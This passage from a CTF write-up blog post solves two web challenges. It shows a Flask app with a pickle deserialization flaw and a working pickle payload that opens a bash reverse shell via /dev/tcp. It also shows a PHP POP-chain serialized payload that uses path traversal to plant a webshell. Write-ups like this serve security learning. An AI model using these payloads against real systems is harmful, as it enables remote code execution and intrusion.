<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,redirect,send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> check(user):</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            username = <span class="string">&quot;bad,bad,hacker&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;CTFer&quot;</span></span><br><span class="line">    pic = <span class="string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="built_in">format</span>(random.randint(<span class="number">1</span>,<span class="number">7</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pic=request.args.get(<span class="string">&#x27;pic&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pic, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pic=<span class="string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="built_in">format</span>(random.randint(<span class="number">1</span>,<span class="number">7</span>))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pic, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            base64_data = base64.b64encode(f.read())</span><br><span class="line">            p = base64_data.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, uname=username, pic=p )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>知道了是python的反序列化漏洞，这里直接用<code>巅峰极客2021 opcode</code>的Payload即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = pickletools.optimize(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure>

<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170208845.png" alt="image-20210912170208845"></p>
<p>获得flag<code>flag&#123;a806de95e0fd1e1ba5de6ed1ef20adb2&#125;</code></p>
<h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p>构造POP链如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$v0id</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$v0id</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v0id = <span class="variable">$v0id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">v0id</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$xin</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$group</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$group</span>, <span class="variable">$name</span>, <span class="variable">$url</span>,<span class="variable">$xin</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;group = <span class="variable">$group</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xin=<span class="variable">$xin</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$logwriter</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$writer</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logwriter = <span class="variable">$writer</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">host</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$format</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;format = <span class="variable">$format</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filters</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$endl</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$endl</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filters = <span class="variable">$filters</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;endl = <span class="variable">$endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c4t</span> </span>&#123;&#125;;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> c4t();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> yang(<span class="variable">$a</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> host(<span class="keyword">new</span> v0id(<span class="string">&quot;/../../../../../var/www/html/atao.php&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> xin(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> v0id(<span class="string">&#x27;&lt;?=`ls`;?&gt;&#x27;</span>,<span class="string">&#x27;../../../../../../var/www/html&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="keyword">new</span> fz(<span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$g</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%BD%91%E5%88%83%E6%9D%AF/Web/image-20210912170647316.png" alt="image-20210912170647316"></p>
<p>接着访问<code>fffffffffffllllllllaaaag</code>文件，下载下来</p>
<p>直接获得flag<code>flag&#123;v3rY_Ez_Php_P0p&#125;</code></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2021网刃杯WP</p><p><a href="https://wp.n03tack.top/posts/1010/">https://wp.n03tack.top/posts/1010/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="https://wp.n03tack.top"><p>n03tAck</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-09-14</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-09-14</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/posts/4906/" target="_blank">2021安询杯wp</a><br></span><span>  2.<a class="is-size-6" href="/posts/14620/" target="_blank">2021陇原战疫WP</a><br></span><span>  3.<a class="is-size-6" href="/posts/5066/" target="_blank">2021bytectf线上WP</a><br></span><span>  4.<a class="is-size-6" href="/posts/47585/" target="_blank">2021绿城杯wp</a><br></span><span>  5.<a class="is-size-6" href="/posts/11556/" target="_blank">2021第一届长城杯网络安全大赛WP</a><br></span><span>  6.<a class="is-size-6" href="/posts/56002/" target="_blank">2021第五空间大赛WP</a><br></span><span>  7.<a class="is-size-6" href="/posts/62454/" target="_blank">2021第二届祥云杯WP</a><br></span><span>  8.<a class="is-size-6" href="/posts/53053/" target="_blank">2021SSTF-Hacker&#039;s Playground!</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/7D1F151CCE01A9E6F955D3AD0195257F.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/5528B1622BD2CEB3A2EF095643DE9949.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/56002/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021第五空间大赛WP</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/62454/"><span class="level-item">2021第二届祥云杯WP</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#成绩"><span>成绩</span></a></li><li><a class="is-flex is-mobile" href="#MISC部分"><span>MISC部分</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#签到"><span>签到</span></a></li><li><a class="is-flex is-mobile" href="#baby-usb"><span>baby-usb</span></a></li><li><a class="is-flex is-mobile" href="#Mspaint"><span>Mspaint</span></a></li><li><a class="is-flex is-mobile" href="#encrypted-ad1"><span>encrypted ad1</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#协议"><span>协议</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#藏在s7里的秘密"><span>藏在s7里的秘密</span></a></li><li><a class="is-flex is-mobile" href="#老练的黑客"><span>老练的黑客</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Reverse"><span>Reverse</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#reverse1"><span>reverse1</span></a></li><li><a class="is-flex is-mobile" href="#2048小游戏"><span>2048小游戏</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#web"><span>web</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#ez-sql"><span>ez_sql</span></a></li><li><a class="is-flex is-mobile" href="#ez-web"><span>ez_web</span></a></li><li><a class="is-flex is-mobile" href="#ez-php"><span>ez_php</span></a></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/logo.png" alt="n03tAck"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">n03tAck</p><p class="is-size-6 is-block">n03tAck战队writeup</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">1</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/dota-st" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/admin@wlhhlc.top"><i class="fa fa-envelope"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.wlhhlc.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">dota_st</span></span><span class="level-right"><span class="level-item tag">www.wlhhlc.top</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-28T07:11:45.000Z">2021-11-28</time></p><p class="title"><a href="/posts/4906/">2021安询杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T01:41:17.000Z">2021-11-08</time></p><p class="title"><a href="/posts/14620/">2021陇原战疫WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-19T14:11:59.000Z">2021-10-19</time></p><p class="title"><a href="/posts/5066/">2021bytectf线上WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-30T04:23:00.000Z">2021-09-30</time></p><p class="title"><a href="/posts/47585/">2021绿城杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-19T15:05:06.000Z">2021-09-19</time></p><p class="title"><a href="/posts/11556/">2021第一届长城杯网络安全大赛WP</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/WP/"><span class="tag">WP</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a><p class="size-small"><span>&copy; 2021 n03tAck</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容创作权归属n03tAck战队所有]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
                document.getElementById("statistic-times").innerHTML = "❤️本站自 <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> 已运行 <strong>" + dnum + "</strong> 天 <strong>" + hnum + "</strong> 小时 <strong>" + mnum + "</strong> 分 <strong>" + snum + "</strong> 秒！❤️";
        }var now = new Date();setInterval("createTime('2021/08/19 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️感谢 <strong><span id="busuanzi_value_site_uv">99+</span></strong> 小伙伴的 <strong><span id="busuanzi_value_site_pv">99+</span></strong> 次光临！❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2364053447" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//代表点击链接就更新
            selectors: [  //代表要更新的节点
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // 开始 PJAX 执行的函数
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(true){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script><script type="text/javascript">function loadMathJax() { //加载mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };loadMathJax();</script></body></html>